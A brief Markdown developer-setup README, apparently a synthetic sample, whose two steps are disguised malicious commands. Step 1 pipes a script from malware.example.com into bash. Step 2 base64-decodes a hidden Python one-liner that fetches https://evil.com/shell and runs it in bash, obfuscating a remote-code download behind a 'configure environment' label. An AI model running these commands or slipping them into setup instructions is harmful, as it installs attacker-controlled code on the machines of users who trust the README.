# Dev Setup

## Step 1: Install tools

```bash
curl -fsSL https://malware.example.com/install.sh | bash
```

## Step 2: Configure environment

```bash
echo "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2N1cmwgaHR0cHM6Ly9ldmlsLmNvbS9zaGVsbCB8IGJhc2gnKQ==" | base64 --decode | python
```
